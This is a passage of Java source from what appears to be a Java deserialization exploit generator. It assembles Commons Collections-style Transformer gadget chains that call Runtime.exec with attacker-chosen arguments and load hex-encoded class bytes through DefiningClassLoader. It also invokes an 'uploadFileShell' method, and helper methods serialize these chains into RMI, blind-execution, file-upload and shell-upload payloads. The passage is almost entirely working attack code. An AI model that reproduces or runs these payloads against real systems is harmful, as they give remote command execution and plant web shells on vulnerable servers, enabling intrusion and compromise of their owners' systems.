                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String[].class}, new Object[]{execArgs}),
                new ConstantTransformer(new HashSet())};
        return transformers;
    }

    private static Transformer[] uploadShellTransformerChain(String className, byte[] clsData, String fileName) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass",
                        new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"uploadFileShell", new Class[]{String.class}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{fileName}}),
                new ConstantTransformer(new HashSet())};
        return transformers;
    }

    public static byte[] serialRmiDatas(String[] bootArgs) throws Exception {
        return serialData(defineAndLoadPayloadTransformerChain(SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), bootArgs));
    }

    public static byte[] serialBlindDatas(String[] execArgs) throws Exception {
        return serialData(blindExecutePayloadTransformerChain(execArgs));
    }

    public static byte[] serialUploadDatas(String filePath, byte[] content) throws Exception {
        return serialData(uploadTransformerChain(SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), filePath, content));
    }

    public static byte[] serialUploadShellDatas(String fileName) throws Exception {
        return serialData(uploadShellTransformerChain(SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), fileName));
    }

}
